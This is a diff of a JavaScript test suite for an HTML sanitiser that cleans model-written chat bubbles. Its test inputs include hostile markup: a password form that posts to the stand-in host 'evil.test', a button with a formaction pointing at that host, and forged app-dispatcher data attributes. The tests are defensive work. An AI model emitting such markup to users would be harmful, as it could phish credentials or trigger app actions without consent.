@@ -68,15 +68,50 @@ it("script elements and inline handlers do not survive", () => {
   assert.match(html, />hi</);
 });
 
-it("no data attribute survives from message source", () => {
-  // This is what makes the app's three global dispatchers unreachable from a
-  // bubble: [data-chat-action] (app.js), [data-wf-action] (workflow_api.js) and
-  // [data-orb-action] (message_html.js) can none of them be written by a model.
+it("a data attribute survives only under a name no app dispatcher selects on", () => {
+  // This is what makes the app's global dispatchers unreachable from a bubble:
+  // [data-chat-action] (app.js), [data-wf-action] (workflow_api.js),
+  // [data-orb-action] (message_html.js) and [data-wc-action] (lorebooks.js) can
+  // none of them be written by a model, while a card's own `data-text` still is.
   const html = render(
-    '<span data-wf-action="image_gen:generate" data-chat-action="inspector" data-orb-action="copy" data-msg-id="1">go</span>',
+    '<span data-wf-action="image_gen:generate" data-chat-action="inspector" data-orb-action="copy" ' +
+      'data-wc-action="apply" data-msg-id="1" data-text="Glitch" data-custom-kept="k">go</span>',
   );
-  assert.ok(!/data-/i.test(html), html);
+  const span = reparse(html).querySelector("span");
+  const names = span.getAttributeNames().filter((n) => n.startsWith("data-"));
+  assert.ok(names.length && names.every((n) => n.startsWith("data-custom-")), html);
+  assert.equal(span.getAttribute("data-custom-text"), "Glitch");
+  assert.equal(span.getAttribute("data-custom-chat-action"), "inspector");
+  assert.equal(span.getAttribute("data-custom-kept"), "k");
   assert.match(html, />go</);
+});
+
+it("a card's attr(data-*) effect reads the attribute the sanitiser renamed", () => {
+  const html = render(
+    '<style>.glitch::before { content: attr(data-text) } [data-mood=calm] { color: teal }</style>' +
+      '<span class="glitch" data-text="Glitch" data-mood="calm">Glitch</span>',
+  );
+  const root = reparse(html);
+  const sheet = root.querySelector("style")?.textContent || "";
+  assert.match(sheet, /attr\(data-custom-text\)/);
+  assert.match(sheet, /\[data-custom-mood=calm\]/);
+  assert.ok(root.querySelector(".custom-glitch[data-custom-text=Glitch][data-custom-mood=calm]"), html);
+});
+
+it("the world-proposal dispatcher ignores a proposal forged in a bubble", async () => {
+  const doc = globalThis.document;
+  const { initWorldProposalActions } = await import("../../frontend/lorebooks.js");
+  initWorldProposalActions();
+  // The first lock is the rename above; this is the second, with the attribute
+  // names written as the dispatcher reads them, as if the rename had failed.
+  doc.body.innerHTML =
+    '<div class="msg-body"><div data-wc-id="c" data-wc-world="w"><button data-wc-action="apply">ok</button></div></div>';
+  const button = doc.querySelector("button");
+  const event = new globalThis.MouseEvent("click", { bubbles: true, cancelable: true });
+  button.dispatchEvent(event);
+  assert.equal(event.defaultPrevented, false);
+  assert.equal(button.disabled, false);
+  doc.body.innerHTML = "";
 });
 
 it("a comment is dropped rather than shown as text", () => {
@@ -122,15 +157,38 @@ it("a control that would paint outside the bubble does not survive", () => {
 });
 
 it("a model-written form still cannot be built around them", () => {
-  const html = render('<form action="https://evil.test"><input name="p" type="password"></form>');
-  assert.ok(!/<form/i.test(html), html);
-  assert.ok(!/<select|<textarea|<button/i.test(render("<select></select><textarea></textarea><button>b</button>")));
+  // A form submits: with no action it navigates the app, with one it posts what
+  // was typed off-site. Its controls stay, and submit nowhere.
+  const html = render('<form action="https://evil.test"><input name="p" type="password"><button>Go</button></form>');
+  assert.ok(!/<form|action=/i.test(html), html);
+  assert.match(html, /<input[^>]*type="password"/);
+  assert.match(html, /<button>Go<\/button>/);
 });
 
-it("a model-written button is dropped, and its label stays as text", () => {
-  const html = render('<button data-wf-action="image_gen:generate">Generate an image</button>');
-  assert.ok(!/<button/i.test(html), html);
-  assert.match(html, /Generate an image/);
+it("buttons, selects and textareas render, and reach nothing in the app", () => {
+  const html = render(
+    '<button data-wf-action="image_gen:generate" form="composer" formaction="https://evil.test">Generate</button>' +
+      '<select><option>Left</option><option selected>Right</option></select><textarea rows="2">notes</textarea>',
+  );
+  const root = reparse(html);
+  const button = root.querySelector("button");
+  assert.equal(button?.textContent, "Generate");
+  // No dispatcher name, and no way to borrow an app form or a submit target.
+  assert.deepEqual(button.getAttributeNames().sort(), ["data-custom-wf-action"]);
+  assert.equal(root.querySelector("select")?.value, "Right");
+  assert.equal(root.querySelector("textarea")?.value, "notes");
+});
+
+it("a textarea's text is kept verbatim rather than laid out as prose", () => {
+  const root = reparse(render("<textarea>line one\n\nline *two*</textarea>"));
+  assert.equal(root.querySelector("textarea")?.value.trim(), "line one\n\nline *two*");
+});
+
+it("marquee keeps its own tuning attributes", () => {
+  const html = render('<marquee behavior="alternate" scrollamount="20" scrolldelay="60">hi</marquee>');
+  assert.match(html, /behavior="alternate"/);
+  assert.match(html, /scrollamount="20"/);
+  assert.match(html, /scrolldelay="60"/);
 });
 
 it("an id cannot collide with one the app looks up", () => {
